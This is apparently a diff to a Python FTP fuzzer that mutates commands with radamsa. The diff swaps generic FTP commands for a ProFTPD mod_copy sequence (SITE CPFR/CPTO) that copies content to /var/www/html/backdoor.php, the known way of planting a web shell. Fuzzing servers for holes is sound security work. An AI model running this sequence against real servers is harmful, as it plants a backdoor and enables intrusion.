@@ -50,20 +50,13 @@ class FTP(Base):
 		super().__init__("FTP")
 		self.path = "/home/phantom"
 		self.command = [
-			("USER", "ftp"),  # 사용자 이름
-			("PASS", "ftp"),  # 비밀번호
-			("PWD", None),  # 현재 디렉토리 확인
-			("CWD", "/tmp/test"),  # 디렉토리 변경
-			("MKD", "/tmp/test2"),  # 디렉토리 생성
-			("DELE", "test.txt"),  # 파일 삭제
-			("RMD", "/tmp/test"),  # 디렉토리 삭제
-			("ABOR", None),  # 전송 중단
-			("RETR", "test.txt"),  # 파일 다운로드
-			("RNFR", "rename.txt"),  # 파일 이름 변경 (원본 이름)
-			("RNTO", "new_rename.txt"),  # 파일 이름 변경 (새 이름)
-			("SITE", "CHMOD 755 test.txt"),  # 사이트별 명령어 전달
-			("STOR", "upload_file.txt"),  # 파일 업로드
-			("QUIT", None),  # FTP 세션 종료
+			("USER", "ftp"),
+			("PASS", "ftp"),
+			("SITE CPFR", "/proc/self/cmdline"),
+			("SITE CPTO", "/tmp/.exploit.php"),
+			("SITE CPFR", "/tmp/.exploit.php"),
+			("SITE CPTO", "/var/www/html/backdoor.php"),
+			("QUIT", None),
 		]
 		self.state = State()
 		self.radamsa = Radamsa()
@@ -71,53 +64,41 @@ class FTP(Base):
 
 	def initialize(self, session: Session) -> None:
 		previous_request = None
-		for cmd, arg in self.command:
-			if self.state.state == "INITIAL" and cmd == "USER":
-				dynamic_arg = self.generate_radamsa_argument(cmd, arg, 1.5, 42)
-				req = self.generate_packet(cmd, dynamic_arg)
-				session.connect(session.root, req)
-				previous_request = req
-				self.state.update_state(cmd)
-				break
+		# 로그인 단계
+		for cmd, arg in [("USER", "ftp"), ("PASS", "ftp")]:
+			req = self.generate_packet(cmd, arg)
+			session.connect(session.root, req)
+			previous_request = req
+			self.state.update_state(cmd)
 
-		# 이후 상태 전이에 따른 명령어 연결
+		# 취약점 테스트 단계
 		for cmd, arg in self.command:
 			if self.state.get_next_state(cmd) != "INVALID":
-				# pyradamsa를 사용하여 변형된 인자 생성
-				dynamic_arg = self.generate_radamsa_argument(cmd, arg, 1.0, random.randint(0, 1000))
+				dynamic_arg = self.generate_radamsa_argument(cmd, arg, seed=random.randint(0, 1000))
 				req = self.generate_packet(cmd, dynamic_arg)
 				session.connect(previous_request, req)
 				self.state.update_state(cmd)
 				previous_request = req
 
 	def generate_radamsa_argument(
-		self, cmd: str, base_value: Optional[str], ratio: float, seed: Optional[int]
+		self,
+		cmd: str,
+		base_value: Optional[str],
+		seed: Optional[int],
+		mutations: str = "",
+		patterns: str = "",
+		generators: str = "",
 	) -> str:
 		if base_value is None:
 			base_value = "default"
 
-		radamsa_options = {"ratio": ratio}
-		if seed is not None:
-			radamsa_options["seed"] = seed
-
-		if cmd == "CWD":
-			mutated_value = self.radamsa.fuzz(
-				f"/tmp/../home/{random.randint(1, 100)}".encode(), **radamsa_options
-			)
-		elif cmd in ["RETR", "STOR"]:
-			mutated_value = self.radamsa.fuzz(
-				f"file_{random.randint(1, 100)}.txt".encode(), **radamsa_options
-			)
-		elif cmd == "SITE":
-			mutated_value = self.radamsa.fuzz(
-				f"CHMOD {random.randint(400, 755)}; ls -al".encode(), **radamsa_options
-			)
-		elif cmd in ["RNFR", "RNTO"]:
-			mutated_value = self.radamsa.fuzz(
-				f"rename_{random.randint(1, 100)}.txt".encode(), **radamsa_options
-			)
-		else:
-			mutated_value = self.radamsa.fuzz(base_value.encode(), **radamsa_options)
+		radamsa_options = {
+			"seed": seed,
+			"mutations": mutations,
+			"patterns": patterns,
+			"generators": generators,
+		}
+		mutated_value = self.radamsa.fuzz(base_value.encode(), **radamsa_options)
 
 		return mutated_value.decode("utf-8")
 
@@ -133,7 +114,6 @@ class FTP(Base):
 					String(name="argument", default_value=arg) if arg else None,
 				),
 			)
-
 		return Request(name=cmd.lower(), children=(block, Static(name="end", default_value="\r\n")))
 
 	def scan_directory_files(self) -> list[str]:
@@ -147,9 +127,9 @@ class FTP(Base):
 
 		command_dict.update(
 			{
-				"RETR": files[0] if files else "default.txt",  # 첫 번째 파일로 다운로드 테스트
-				"STOR": "upload_file.txt",  # 업로드할 파일
-				"RNFR": files[0] if files else "default.txt",  # 이름 변경할 원본 파일
+				"RETR": files[0] if files else "default.txt",
+				"STOR": "upload_file.txt",
+				"RNFR": files[0] if files else "default.txt",
 				"RNTO": "renamed_file.txt",
 			}
 		)
